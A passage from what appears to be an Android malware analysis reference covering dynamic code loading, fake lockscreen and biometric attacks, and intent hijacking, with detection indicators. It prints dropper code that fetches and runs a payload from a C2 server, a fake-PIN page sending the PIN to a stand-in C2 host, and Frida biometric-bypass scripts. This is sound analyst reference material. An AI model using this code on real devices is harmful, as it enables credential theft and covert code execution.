Foreground service type declarations required Malicious services more visible in manifest"},{"location":"attacks/device-wipe-ransomware/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>BIND_DEVICE_ADMIN</code> with <code>wipeData</code> or <code>resetPassword</code> in device admin XML</li> <li><code>DevicePolicyManager.wipeData()</code> or <code>resetPassword()</code> calls</li> <li>AES/RSA encryption imports (<code>javax.crypto.*</code>) combined with file enumeration</li> <li><code>MANAGE_EXTERNAL_STORAGE</code> permission in sideloaded apps</li> <li><code>SYSTEM_ALERT_WINDOW</code> combined with <code>onBackPressed()</code> suppression</li> <li><code>onUserLeaveHint()</code> override in activity (MalLocker.B technique)</li> <li>Bitcoin or cryptocurrency wallet address strings</li> <li>Ransom note templates in string resources or assets</li> </ul> Dynamic Indicators <ul> <li>Device admin activation prompt during app install</li> <li>Sudden PIN/pattern lock change</li> <li>Files renamed with new extensions (<code>.enc</code>, <code>.locked</code>, <code>.cry</code>)</li> <li>Full-screen overlay that persists across Home/Recents presses</li> <li>Factory reset triggered without user interaction</li> <li><code>DevicePolicyManager</code> API calls during or after banking app interaction</li> <li>Network traffic to Tor <code>.onion</code> addresses (Simplocker-era C2)</li> </ul>"},{"location":"attacks/dynamic-code-loading/","title":"Dynamic Code Loading","text":"<p>Loading executable code at runtime rather than including it in the APK. The APK that passes Google Play Protect scanning contains no malicious code -- the real payload is downloaded, decrypted, or assembled after installation. This is the foundational technique behind dropper-based malware distribution and the primary reason Play Store scanners fail to catch banking trojans at upload time.</p> <p>See also: Packers, Hooking, Anti-Analysis Techniques</p> <p>Requirements</p> Requirement Details Permission <code>INTERNET</code> (for network-loaded payloads) Storage Writable directory for DEX files (<code>getFilesDir()</code>, <code>getCacheDir()</code>) API <code>DexClassLoader</code>, <code>InMemoryDexClassLoader</code>, <code>PathClassLoader</code> <p>No special permissions needed. Any app can load code from its own private storage or memory.</p>"},{"location":"attacks/dynamic-code-loading/#class-loaders","title":"Class Loaders","text":"<p>Android provides multiple class loaders for runtime code loading, each with different capabilities.</p>"},{"location":"attacks/dynamic-code-loading/#dexclassloader","title":"DexClassLoader","text":"<p>The standard approach. Loads a DEX or JAR file from disk, outputs an optimized OAT file to a specified directory.</p> <pre><code>File dexFile = new File(getFilesDir(), \"payload.dex\");\nFile optimizedDir = getDir(\"odex\", Context.MODE_PRIVATE);\n\nDexClassLoader loader = new DexClassLoader(\n    dexFile.getAbsolutePath(),\n    optimizedDir.getAbsolutePath(),\n    null,\n    getClassLoader()\n);\n\nClass&lt;?&gt; payloadClass = loader.loadClass(\"com.malware.Payload\");\nMethod entryPoint = payloadClass.getMethod(\"execute\", Context.class);\nentryPoint.invoke(null, getApplicationContext());\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#inmemorydexclassloader","title":"InMemoryDexClassLoader","text":"<p>Introduced in Android 8.0 (API 26). Loads DEX directly from a <code>ByteBuffer</code> without writing to disk. Significantly harder to detect and extract because the payload never touches the filesystem.</p> <pre><code>byte[] dexBytes = decryptPayload(getEncryptedAsset(\"config.dat\"));\nByteBuffer buffer = ByteBuffer.wrap(dexBytes);\n\nInMemoryDexClassLoader loader = new InMemoryDexClassLoader(\n    buffer,\n    getClassLoader()\n);\n\nClass&lt;?&gt; cls = loader.loadClass(\"com.malware.Stage2\");\ncls.getMethod(\"init\", Context.class).invoke(null, this);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#pathclassloader-manipulation","title":"PathClassLoader Manipulation","text":"<p>The default <code>PathClassLoader</code> loads the APK's own classes. Malware can manipulate its internal <code>DexPathList</code> to inject additional DEX files into the existing class loader rather than creating a new one. This makes the loaded code appear as part of the original APK to reflection-based inspection.</p> <pre><code>Object pathList = getField(classLoader, \"pathList\");\nObject[] dexElements = (Object[]) getField(pathList, \"dexElements\");\n\nMethod makeElement = findMakeElementMethod(pathList);\nObject newElement = makeElement.invoke(null, payloadDexFile);\n\nObject[] combined = Arrays.copyOf(dexElements, dexElements.length + 1);\ncombined[dexElements.length] = newElement;\nsetField(pathList, \"dexElements\", combined);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#payload-sources","title":"Payload Sources","text":"Source Stealth Persistence Used By Encrypted asset in APK Low (payload in APK, just encrypted) High (survives without network) Harly, most packers Network download from C2 High (no payload in APK at install) Low (requires C2 availability) Joker, Anatsa, SharkBot SharedPreferences (Base64) Medium (stored as string data) Medium Joker variants ContentProvider from another app Medium (payload in separate app) Medium Triada (system-level) Steganographic image High (payload hidden in PNG/JPEG) Medium (image cached locally) Necro Expansion files (OBB) Medium (separate download from Play) High Older dropper techniques Firebase/cloud config High (legitimate service as payload host) Low SpyLoan variants"},{"location":"attacks/dynamic-code-loading/#multi-stage-dropper-architecture","title":"Multi-Stage Dropper Architecture","text":"<p>The standard architecture for Play Store malware uses staged payload delivery to separate the benign-looking dropper from the malicious functionality.</p>"},{"location":"attacks/dynamic-code-loading/#stage-1-play-store-dropper","title":"Stage 1: Play Store Dropper","text":"<p>A functional app (QR scanner, PDF reader, file manager) that passes all Play Store checks. Contains no malicious code. After installation, it contacts C2 to determine whether to activate.</p> <p>Common activation conditions:</p> <ul> <li>Time delay (24-72 hours post-install to evade sandbox analysis)</li> <li>Geographic check (IP geolocation or SIM country code)</li> <li>Device validation (not an emulator, no analysis tools detected)</li> <li>C2 flag (server-side kill switch)</li> </ul>"},{"location":"attacks/dynamic-code-loading/#stage-2-downloaded-payload","title":"Stage 2: Downloaded Payload","text":"<p>Once activated, Stage 1 downloads the real payload:</p> <pre><code>OkHttpClient client = new OkHttpClient();\nRequest request = new Request.Builder()\n    .url(c2Url + \"/payload/\" + deviceId)\n    .build();\n\nResponse response = client.newCall(request).execute();\nbyte[] encrypted = response.body().bytes();\nbyte[] dexBytes = decrypt(encrypted, derivedKey);\n\nFile payloadFile = new File(getFilesDir(), \"classes.dex\");\nFileOutputStream fos = new FileOutputStream(payloadFile);\nfos.write(dexBytes);\nfos.close();\n\nDexClassLoader loader = new DexClassLoader(\n    payloadFile.getAbsolutePath(),\n    getDir(\"opt\", MODE_PRIVATE).getAbsolutePath(),\n    null,\n    getClassLoader()\n);\nloader.loadClass(\"com.payload.Main\")\n    .getMethod(\"start\", Context.class)\n    .invoke(null, this);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#stage-3-c2-modules","title":"Stage 3: C2 Modules","text":"<p>Some families support modular architecture where individual capabilities are loaded as separate DEX modules from C2:</p> Module Functionality Loaded When <code>overlay.dex</code> Inject kit for banking apps Target app detected on device <code>sms.dex</code> SMS interception Post-privilege escalation <code>vnc.dex</code> Remote screen access Operator requests session <code>keylog.dex</code> Accessibility keylogger Always loaded <code>ats.dex</code> Automated transfer scripts Target bank identified"},{"location":"attacks/dynamic-code-loading/#reflection-based-instantiation","title":"Reflection-Based Instantiation","text":"<p>After loading a class, malware uses reflection to instantiate and invoke methods without compile-time dependencies. This also defeats static analysis since there are no direct references to the payload classes.</p> <pre><code>Class&lt;?&gt; cls = loader.loadClass(\"com.payload.EntryPoint\");\n\nObject instance = cls.getDeclaredConstructor().newInstance();\n\nMethod init = cls.getDeclaredMethod(\"initialize\", Context.class, String.class);\ninit.setAccessible(true);\ninit.invoke(instance, context, c2Url);\n\nMethod run = cls.getDeclaredMethod(\"run\");\nrun.setAccessible(true);\nrun.invoke(instance);\n</code></pre>"},{"location":"attacks/dynamic-code-loading/#families-using-dynamic-code-loading","title":"Families Using Dynamic Code Loading","text":"Family Loading Method Payload Source Stages Joker DexClassLoader C2 download, SharedPreferences 2-3 Anatsa DexClassLoader C2 download (staged) 3 SharkBot DexClassLoader Auto-update from C2 2 Necro InMemoryDexClassLoader Steganographic PNG 3 Mandrake DexClassLoader Multi-stage C2 delivery 4 Harly DexClassLoader Encrypted APK assets 2 Triada PathClassLoader injection System partition / ContentProvider 2 Xenomorph DexClassLoader Dropper downloads payload APK 2 Hook DexClassLoader Dropper with encrypted asset 2 Vultur DexClassLoader C2 download (encrypted) 3 GoldPickaxe InMemoryDexClassLoader C2 download 2 SpyLoan DexClassLoader Firebase remote config 2"},{"location":"attacks/dynamic-code-loading/#steganographic-payload-delivery","title":"Steganographic Payload Delivery","text":"<p>Steganography as Anti-Detection</p> <p>Necro (2024) demonstrated a notable technique: the payload DEX is embedded within a PNG image using steganographic encoding. The loader extracts pixel data from the image's alpha channel, reassembles the bytes into a DEX file, and loads it via <code>InMemoryDexClassLoader</code>. The PNG itself is a valid image that displays normally, making it invisible to content-based scanning. Check for high-entropy image assets in the APK's resources and assets directories.</p>"},{"location":"attacks/dynamic-code-loading/#connection-to-packing","title":"Connection to Packing","text":"<p>Commercial packers and malware dynamic loaders solve the same problem: executing code that is not visible in the APK's primary <code>classes.dex</code>. A packer encrypts the original DEX and bundles a stub that decrypts and loads it at runtime. The only architectural difference is that packers include the encrypted payload within the APK, while malware droppers download it from an external source.</p> <p>See: Packers for detailed analysis of commercial packing solutions.</p>"},{"location":"attacks/dynamic-code-loading/#android-restrictions","title":"Android Restrictions","text":"Version Restriction Impact Android 8 <code>InMemoryDexClassLoader</code> introduced Enabled fileless payload loading Android 10 Restricted access to <code>/data/local/tmp</code> Minor -- malware uses app-private dirs Android 14 Dynamic code loading from writable paths triggers warning DEX files in writable directories flagged by <code>DexFile</code> loading checks Android 14 <code>ENFORCE_DYNAMIC_CODE_LOADING</code> flag Apps can opt into read-only enforcement for loaded code Android 15 Stricter enforcement for apps targeting API 35 Loaded DEX must be in read-only paths, breaks writable DexClassLoader pattern <p>Android 14's restriction is significant: <code>DexClassLoader</code> loading from <code>getFilesDir()</code> or <code>getCacheDir()</code> now logs warnings, and apps targeting API 34+ that set <code>ENFORCE_DYNAMIC_CODE_LOADING</code> will crash if the loaded file is writable. Malware adapts by marking payload files as read-only after writing, or by using <code>InMemoryDexClassLoader</code> to avoid the filesystem entirely.</p> <p>InMemoryDexClassLoader Leaves No Filesystem Trace</p> <p>If a sample uses <code>InMemoryDexClassLoader</code>, the payload DEX never touches disk. The only way to capture it is at runtime using Frida hooks on the class loader constructor (see the Frida script above) or by dumping the process memory. Static analysis alone will not reveal the payload.</p>"},{"location":"attacks/dynamic-code-loading/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>DexClassLoader</code> or <code>InMemoryDexClassLoader</code> in decompiled code</li> <li><code>Class.forName()</code> with string-constructed class names</li> <li><code>Method.invoke()</code> patterns on reflectively loaded classes</li> <li>Encrypted blobs in assets directory (high entropy files)</li> <li>Network URLs in strings referencing <code>.dex</code>, <code>.jar</code>, or <code>.apk</code> downloads</li> <li><code>getDir(\"odex\")</code> or similar optimized-DEX output directories</li> </ul> Dynamic Indicators <ul> <li>New DEX files appearing in app's private storage post-launch</li> <li>Delayed network requests (hours after install) fetching large binary payloads</li> <li><code>dlopen</code> or <code>System.loadLibrary</code> for native code loading variants</li> <li>Process loading DEX files not present in the original APK</li> </ul> Frida Script -- Dump Dynamically Loaded DEX Files <pre><code>Java.perform(function() {\n    var DexClassLoader = Java.use(\"dalvik.system.DexClassLoader\");\n    DexClassLoader.$init.implementation = function(dexPath, optDir, libPath, parent) {\n        console.log(\"[DCL] Loading DEX from: \" + dexPath);\n        var f = Java.use(\"java.io.File\").$new(dexPath);\n        console.log(\"[DCL] Size: \" + f.length() + \" bytes\");\n        return this.$init(dexPath, optDir, libPath, parent);\n    };\n\n    var InMemDCL = Java.use(\"dalvik.system.InMemoryDexClassLoader\");\n    InMemDCL.$init.overload(\"java.nio.ByteBuffer\", \"java.lang.ClassLoader\")\n        .implementation = function(buffer, parent) {\n            console.log(\"[IMDCL] In-memory DEX loaded, size: \" + buffer.remaining());\n            var bytes = Java.array(\"byte\", new Array(buffer.remaining()));\n            buffer.get(bytes);\n            buffer.rewind();\n            var path = \"/data/local/tmp/dumped_\" + Date.now() + \".dex\";\n            var fos = Java.use(\"java.io.FileOutputStream\").$new(path);\n            fos.write(bytes);\n            fos.close();\n            console.log(\"[IMDCL] Dumped to: \" + path);\n            return this.$init(buffer, parent);\n        };\n\n    var ClassLoader = Java.use(\"java.lang.ClassLoader\");\n    ClassLoader.loadClass.overload(\"java.lang.String\").implementation = function(name) {\n        if (name.indexOf(\"com.malware\") !== -1 || name.indexOf(\"payload\") !== -1) {\n            console.log(\"[CL] loadClass: \" + name);\n        }\n        return this.loadClass(name);\n    };\n});\n</code></pre>"},{"location":"attacks/fake-biometric-prompts/","title":"Fake Biometric Prompts","text":"<p>Stealing device unlock credentials through fake lockscreens and abusing the BiometricPrompt API. Distinct from standard overlay phishing, which targets banking app credentials. This technique captures the device PIN, password, or unlock pattern, giving attackers the ability to unlock the device during remote access sessions and bypass device encryption at rest.</p> <p>Requirements</p> Requirement Details Permission <code>BIND_ACCESSIBILITY_SERVICE</code> or <code>SYSTEM_ALERT_WINDOW</code> Trigger Device lock event or <code>USER_PRESENT</code> broadcast"},{"location":"attacks/fake-biometric-prompts/#android-biometric-architecture","title":"Android Biometric Architecture","text":"<p>Understanding the legitimate API is necessary to understand how it is abused.</p>"},{"location":"attacks/fake-biometric-prompts/#biometric-classes","title":"Biometric Classes","text":"<p>Android categorizes biometric hardware into three strength tiers defined in <code>BiometricManager.Authenticators</code>:</p> Class Strength Hardware Use Cases Class 3 (Strong) Spoofing acceptance rate &lt; 7% Fingerprint sensors, structured-light face (Pixel, iPhone-style) Keystore-bound crypto, payments Class 2 (Weak) Spoofing acceptance rate &lt; 20% Camera-based face unlock on most Android OEMs App unlock, non-crypto auth Class 1 (Convenience) No spoofing requirements Basic face detection Screen unlock only, not available to apps"},{"location":"attacks/fake-biometric-prompts/#biometricprompt-api","title":"BiometricPrompt API","text":"<p>Introduced in Android 9 to unify fingerprint and face authentication. Apps call <code>BiometricPrompt.authenticate()</code> with an optional <code>CryptoObject</code> binding a <code>Cipher</code>, <code>Signature</code>, or <code>Mac</code> to the biometric gate.</p> <pre><code>BiometricPrompt prompt = new BiometricPrompt(activity, executor, callback);\nBiometricPrompt.PromptInfo info = new BiometricPrompt.PromptInfo.Builder()\n    .setTitle(\"Verify identity\")\n    .setNegativeButtonText(\"Use PIN\")\n    .setAllowedAuthenticators(BiometricManager.Authenticators.BIOMETRIC_STRONG)\n    .build();\n\nCipher cipher = getCipherFromKeystore();\nprompt.authenticate(info, new BiometricPrompt.CryptoObject(cipher));\n</code></pre>"},{"location":"attacks/fake-biometric-prompts/#cryptoobject-binding","title":"CryptoObject Binding","text":"<p>When <code>CryptoObject</code> is used, the Keystore key is configured with <code>setUserAuthenticationRequired(true)</code>. The key becomes usable only after successful biometric authentication. The TEE/StrongBox releases the key material only when the biometric HAL reports a match.</p> <p>Without <code>CryptoObject</code>, authentication is purely callback-based: the app trusts the <code>onAuthenticationSucceeded</code> callback without any cryptographic proof. This is the weakness that Frida-based bypasses and malware exploit.</p>"},{"location":"attacks/fake-biometric-prompts/#fake-lockscreen-overlays","title":"Fake Lockscreen Overlays","text":""},{"location":"attacks/fake-biometric-prompts/#trickmos-approach","title":"TrickMo's Approach","text":"<p>TrickMo deploys a full-screen overlay that replicates the device lockscreen. Cleafy first documented this behavior in September 2024, with Zimperium identifying 40+ variants using this technique across 16 droppers.</p> <p>The fake lockscreen is an HTML page hosted externally and rendered full-screen in a <code>WebView</code> overlay:</p> <ol> <li>The malware monitors for device lock events via accessibility</li> <li>When the screen turns on after lock, the malware displays its overlay before the real lockscreen renders</li> <li>The HTML page mimics the OEM-specific lockscreen (Samsung, Pixel, Xiaomi, etc.)</li> <li>The user enters their PIN into the fake overlay</li> <li>The entered PIN is exfiltrated to C2</li> <li>The overlay dismisses and the real lockscreen appears, which the user unlocks normally, unaware of the theft</li> </ol> <p>The HTML page uses JavaScript to capture each digit:</p> <pre><code>&lt;div id=\"pin-dots\"&gt;\n    &lt;span class=\"dot\"&gt;&lt;/span&gt;\n    &lt;span class=\"dot\"&gt;&lt;/span&gt;\n    &lt;span class=\"dot\"&gt;&lt;/span&gt;\n    &lt;span class=\"dot\"&gt;&lt;/span&gt;\n&lt;/div&gt;\n&lt;div id=\"keypad\"&gt;\n    &lt;button onclick=\"enterDigit(1)\"&gt;1&lt;/button&gt;\n    &lt;button onclick=\"enterDigit(2)\"&gt;2&lt;/button&gt;\n    &lt;button onclick=\"enterDigit(3)\"&gt;3&lt;/button&gt;\n&lt;/div&gt;\n&lt;script&gt;\nvar pin = \"\";\nfunction enterDigit(d) {\n    pin += d;\n    document.querySelectorAll(\".dot\")[pin.length-1].classList.add(\"filled\");\n    if (pin.length === 4) {\n        new Image().src = \"https://c2.example/pin?v=\" + pin;\n    }\n}\n&lt;/script&gt;\n</code></pre> <p>Zimperium's analysis of leaked C2 data revealed 12 GB of exfiltrated data including device PINs, banking credentials, and photos from compromised devices.</p>"},{"location":"attacks/fake-biometric-prompts/#tsarbots-pattern-capture","title":"TsarBot's Pattern Capture","text":"<p>TsarBot, discovered by Cyble in March 2025, extends the technique to capture unlock patterns in addition to PINs. TsarBot implements a <code>LockTypeDetector</code> that uses accessibility to determine the device's lock method:</p> Lock Type Detection Method Capture Technique PIN Accessibility reads \"PIN area\" text on lockscreen Keypad overlay Password Accessibility reads \"Password\" text Text field overlay Pattern Accessibility reads pattern-related descriptions Touch tracking on pattern grid overlay <p>TsarBot captures patterns by tracking touch coordinates on a fake 3x3 grid rendered as an overlay. The <code>USER_PRESENT</code> broadcast triggers the fake lockscreen on first unlock after boot. Pattern data is serialized as a sequence of node indices (e.g., <code>0,1,2,5,8</code> for an L-shape) and sent to C2.</p>"},{"location":"attacks/fake-biometric-prompts/#differences-from-banking-overlays","title":"Differences from Banking Overlays","text":"Aspect Banking Overlay Fake Lockscreen Target App credentials Device unlock credential Trigger Target app opened Device lock/unlock event Appearance Mimics banking app login Mimics system lockscreen Purpose Account takeover Device access during RAT sessions Persistence value Single-use per target Permanent device access"},{"location":"attacks/fake-biometric-prompts/#biometric-downgrade-attacks","title":"Biometric Downgrade Attacks","text":"<p>Rather than spoofing biometrics, the attacker forces the device to fall back to PIN/password entry, then captures it.</p>"},{"location":"attacks/fake-biometric-prompts/#chameleons-interrupt_biometric","title":"Chameleon's interrupt_biometric","text":"<p>Chameleon introduced this in December 2023. Upon receiving the <code>interrupt_biometric</code> command from C2, the malware:</p> <ol> <li>Uses accessibility to open Settings &gt; Security &gt; Biometrics</li> <li>Navigates to fingerprint settings</li> <li>Disables fingerprint unlock by toggling it off</li> <li>Repeats for face unlock if present</li> <li>The device now requires PIN/password for all unlock operations</li> <li>Keylogger captures the PIN on next unlock</li> </ol> <p>This works on Android 13+ where the accessibility service has sufficient privileges. The user sees biometrics as \"disabled\" but may attribute it to a system update or glitch.</p>"},{"location":"attacks/fake-biometric-prompts/#api-level-downgrade","title":"API-Level Downgrade","text":"<p>Apps that call <code>BiometricPrompt</code> with <code>setAllowedAuthenticators(BIOMETRIC_STRONG | DEVICE_CREDENTIAL)</code> allow fallback to PIN. The user sees a \"Use PIN\" button on the biometric dialog. Malware with accessibility can click this button to force PIN entry, then capture the keystrokes.</p>"},{"location":"attacks/fake-biometric-prompts/#frida-based-biometricprompt-bypass","title":"Frida-Based BiometricPrompt Bypass","text":"<p>For security researchers and during dynamic analysis, BiometricPrompt can be bypassed with Frida when <code>CryptoObject</code> is not used.</p>"},{"location":"attacks/fake-biometric-prompts/#callback-only-authentication-no-cryptoobject","title":"Callback-Only Authentication (No CryptoObject)","text":"<p>When the app does not bind a <code>CryptoObject</code>, the authentication is purely callback-based. Frida hooks <code>BiometricPrompt.authenticate()</code> and immediately triggers <code>onAuthenticationSucceeded</code>:</p> <pre><code>Java.perform(function() {\n    var BiometricPrompt = Java.use(\"androidx.biometric.BiometricPrompt\");\n    var AuthResult = Java.use(\"androidx.biometric.BiometricPrompt$AuthenticationResult\");\n    var CryptoObject = Java.use(\"androidx.biometric.BiometricPrompt$CryptoObject\");\n\n    BiometricPrompt.authenticate.overload(\n        \"androidx.biometric.BiometricPrompt$PromptInfo\"\n    ).implementation = function(info) {\n        var callback = this.mAuthenticationCallback.value;\n        var result = AuthResult.$new.overload(\n            \"androidx.biometric.BiometricPrompt$CryptoObject\"\n        ).call(AuthResult, null);\n        callback.onAuthenticationSucceeded(result);\n    };\n});\n</code></pre> <p>This script intercepts the authenticate call, skips the actual biometric check, and fires the success callback with a null <code>CryptoObject</code>. The app proceeds as if authentication succeeded.</p>"},{"location":"attacks/fake-biometric-prompts/#cryptoobject-bound-authentication","title":"CryptoObject-Bound Authentication","text":"<p>When the app uses <code>CryptoObject</code>, the Keystore key is locked behind biometric authentication in hardware. A null <code>CryptoObject</code> bypass causes a <code>javax.crypto.IllegalBlockSizeException</code> when the app tries to use the cipher.</p> <p>To bypass CryptoObject-bound authentication:</p> <ol> <li>Hook <code>KeyGenParameterSpec.Builder.setUserAuthenticationRequired</code> to return <code>false</code></li> <li>Regenerate the key without biometric binding</li> <li>Use the unbound key for encryption/decryption</li> </ol> <pre><code>Java.perform(function() {\n    var KeyGenSpec = Java.use(\n        \"android.security.keystore.KeyGenParameterSpec$Builder\"\n    );\n    KeyGenSpec.setUserAuthenticationRequired.implementation = function(required) {\n        return this.setUserAuthenticationRequired(false);\n    };\n});\n</code></pre> <p>This requires the app to regenerate its key, so it is not always applicable to existing sessions.</p>"},{"location":"attacks/fake-biometric-prompts/#legacy-fingerprintmanager","title":"Legacy FingerprintManager","text":"<p>Older apps targeting pre-Android 9 may still use the deprecated <code>FingerprintManager</code>. The same callback-hooking approach applies, targeting <code>FingerprintManager$AuthenticationCallback.onAuthenticationSucceeded</code>.</p>"},{"location":"attacks/fake-biometric-prompts/#biometric-class-implications-for-attackers","title":"Biometric Class Implications for Attackers","text":"Class Keystore Binding Frida Bypass Overlay Feasible Notes Class 3 Supported Only if app skips CryptoObject No (system-drawn prompt) Hardware-enforced, hardest to bypass Class 2 Not supported Yes (callback-only) Possible Camera-based, easier to spoof Class 1 Not available to apps N/A N/A Screen unlock only <p>Apps using <code>BIOMETRIC_STRONG</code> with <code>CryptoObject</code> are resistant to both Frida callback bypass and overlay attacks because the BiometricPrompt is drawn by the system (not the app) and the cryptographic key is hardware-bound.</p> <p>Apps using <code>BIOMETRIC_WEAK</code> or omitting <code>CryptoObject</code> are vulnerable to both approaches.</p>"},{"location":"attacks/fake-biometric-prompts/#family-comparison","title":"Family Comparison","text":"Family Technique Target Year TrickMo Full-screen HTML lockscreen overlay PIN 2024 TsarBot Lockscreen overlay with pattern tracking PIN, password, pattern 2025 Chameleon Biometric disable via accessibility PIN (via keylogging after downgrade) 2023 GoldPickaxe Fake biometric prompt to capture face video Facial biometric data 2024 Hook Screen streaming during biometric entry Observe PIN entry via VNC 2023 Cerberus Keylogging during PIN entry PIN 2019"},{"location":"attacks/fake-biometric-prompts/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>HTML files matching lockscreen UI patterns in assets or downloaded from C2</li> <li>References to <code>USER_PRESENT</code> broadcast action</li> <li>Accessibility service monitoring lock/unlock events</li> <li>JavaScript with PIN/pattern capture logic</li> <li><code>BiometricPrompt</code> or <code>FingerprintManager</code> references in non-authentication contexts</li> </ul> Dynamic Indicators <ul> <li>Overlay appearing at device unlock rather than app launch</li> <li>Full-screen WebView rendered during lock-to-unlock transition</li> <li>Network request containing numeric or pattern data immediately after unlock</li> <li>Accessibility events targeting Security settings to disable biometrics</li> </ul>"},{"location":"attacks/fake-biometric-prompts/#cross-references","title":"Cross-References","text":"<ul> <li>Overlay Attacks -- the foundational overlay technique; fake lockscreens are a specialized variant</li> <li>Accessibility Abuse -- accessibility enables both the overlay display and biometric disabling</li> <li>Keylogging -- captures PINs after biometric downgrade forces PIN entry</li> <li>Runtime Permission Manipulation -- biometric downgrade is one form of accessibility-based device manipulation</li> <li>TrickMo -- primary family using fake lockscreen PIN capture</li> <li>TsarBot -- extends technique to pattern and password capture</li> </ul>"},{"location":"attacks/intent-hijacking/","title":"Intent Hijacking","text":"<p>Intercepting or redirecting intents meant for another app component. Possible when an app sends implicit intents or exports components without proper protection. The attacker's app registers to handle the same intent and receives data meant for the legitimate component.</p> <p>Requirements</p> Requirement Details Permission None (exploits component export misconfiguration) Condition Target app uses implicit intents or exports components without restrictions"},{"location":"attacks/intent-hijacking/#variants","title":"Variants","text":""},{"location":"attacks/intent-hijacking/#implicit-intent-interception","title":"Implicit Intent Interception","text":"<p>When an app sends an implicit intent (no target component specified), Android resolves it to any matching component. If a malicious app declares a matching <code>&lt;intent-filter&gt;</code>, it can receive the intent.</p> <pre><code>&lt;activity android:name=\".MaliciousActivity\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"com.target.app.CUSTOM_ACTION\" /&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>If the target app sends <code>new Intent(\"com.target.app.CUSTOM_ACTION\")</code> without specifying a component, the system may route it to the malicious activity. If multiple handlers exist, the user sees a chooser dialog (which social engineering can handle).</p>"},{"location":"attacks/intent-hijacking/#activity-hijacking-via-startactivityforresult","title":"Activity Hijacking via <code>startActivityForResult</code>","text":"<p>When an app starts an implicit activity expecting a result, the malicious activity can return crafted data:</p> <ol> <li>Target app calls <code>startActivityForResult()</code> with implicit intent</li> <li>Malicious activity catches the intent</li> <li>Malicious activity reads any extras (potentially sensitive data)</li> <li>Malicious activity returns a crafted result to influence the caller's behavior</li> </ol>"},{"location":"attacks/intent-hijacking/#exported-component-abuse","title":"Exported Component Abuse","text":"<p>Components declared with <code>android:exported=\"true\"</code> (or with an intent filter, which implies export on API &lt; 31) can be started by any app:</p> <pre><code>Intent intent = new Intent();\nintent.setComponent(new ComponentName(\"com.target.app\", \"com.target.app.InternalActivity\"));\nstartActivity(intent);\n</code></pre> <p>This can reach activities not designed for external use: admin panels, debug screens, data viewers.</p>"},{"location":"attacks/intent-hijacking/#intent-redirection","title":"Intent Redirection","text":"<p>A more powerful variant where a vulnerable app is tricked into launching its own non-exported components on behalf of the attacker. Oversecured's systematic research found this in more than 80% of analyzed apps. The attack flow:</p> <ol> <li>Attacker sends an intent to an exported activity that accepts an \"inner intent\" parameter</li> <li>The exported activity extracts the inner intent and calls <code>startActivity()</code> with it</li> <li>Since the call originates from within the app's own process, non-exported components are reachable</li> </ol> <p>This is particularly dangerous because it grants access to content providers, WebViews, and internal activities that were never designed for external interaction. Oversecured's Samsung research used this to access system-level components on Samsung devices, and their Google apps audit found widespread intent redirection across 225 Google applications.</p>"},{"location":"attacks/intent-hijacking/#arbitrary-code-execution-via-package-contexts","title":"Arbitrary Code Execution via Package Contexts","text":"<p>Oversecured documented how Android's package context resolution can be exploited for arbitrary code execution. By manipulating how Android resolves and loads code from third-party package contexts, an attacker can execute arbitrary code within the target app's process, inheriting all its permissions and data access.</p>"},{"location":"attacks/intent-hijacking/#service-hijacking","title":"Service Hijacking","text":"<p>An implicit intent to bind a service can be intercepted by a malicious service. The malicious service then receives all IPC calls meant for the legitimate service.</p> <p>On Android 5.0+, implicit intents to services throw an exception, forcing explicit binding. This largely eliminates this variant on modern devices.</p>"},{"location":"attacks/intent-hijacking/#ordered-broadcast-interception","title":"Ordered Broadcast Interception","text":"<p>See Broadcast Theft for broadcast-specific interception.</p>"},{"location":"attacks/intent-hijacking/#real-world-impact","title":"Real-World Impact","text":"Vulnerability Type Example OAuth redirect interception Malicious app registers for the OAuth callback URI scheme, stealing authorization codes Payment intent interception Intercepting payment processing intents to redirect to attacker-controlled handlers File sharing interception Registering for <code>ACTION_SEND</code> to capture files shared between apps Deep link hijacking See Deep Link Exploitation"},{"location":"attacks/intent-hijacking/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 5.0 (API 21) Implicit intents to services throw <code>IllegalArgumentException</code> Does not affect activities or broadcast receivers Android 12 (API 31) Components with intent filters must explicitly declare <code>android:exported</code> Developers often set <code>exported=\"true\"</code> to resolve build errors Android 12+ <code>PendingIntent</code> mutability must be declared (<code>FLAG_MUTABLE</code> / <code>FLAG_IMMUTABLE</code>) Apps requiring <code>FLAG_MUTABLE</code> (notifications, MediaSession) remain vulnerable if base intent is not fully specified"},{"location":"attacks/intent-hijacking/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Implicit intents sent with sensitive data in extras</li> <li>Components with <code>android:exported=\"true\"</code> that handle sensitive operations</li> <li>Activities without <code>android:permission</code> protection that accept external input</li> <li><code>PendingIntent</code> creation without <code>FLAG_IMMUTABLE</code></li> <li>Custom URI schemes without proper validation</li> <li>Activities that extract and launch \"inner intents\" from extras (intent redirection)</li> </ul> Dynamic Indicators <ul> <li>Exported activities reachable via <code>adb shell am start</code> that expose internal functionality</li> <li>PendingIntents intercepted via notification or widget that accept modified base intents</li> <li>Implicit intents routed to unexpected handler apps</li> </ul> <p>Oversecured's interception of implicit intents guide provides detailed technical coverage of implicit intent resolution mechanics and exploitation patterns.</p>"},{"location":"attacks/intent-hijacking/#pending-intent-vulnerabilities","title":"Pending Intent Vulnerabilities","text":"<p>A <code>PendingIntent</code> wraps an intent and grants the recipient permission to execute it as if it came from the original sender, with the sender's identity and permissions. When a <code>PendingIntent</code> is created as mutable (<code>FLAG_MUTABLE</code>), the recipient can modify the base intent before executing it -- changing the target component, adding extras, or altering the action.</p>"},{"location":"attacks/intent-hijacking/#attack-flow","title":"Attack Flow","text":"<ol> <li>A privileged app (e.g., system service, banking app) creates a <code>PendingIntent</code> for a notification action, widget update, or <code>MediaSession</code> callback</li> <li>The <code>PendingIntent</code> is delivered to a less-privileged context -- a notification visible to all apps, a widget host, or an IPC call</li> <li>The attacker's app receives or intercepts the <code>PendingIntent</code></li> <li>If the <code>PendingIntent</code> is 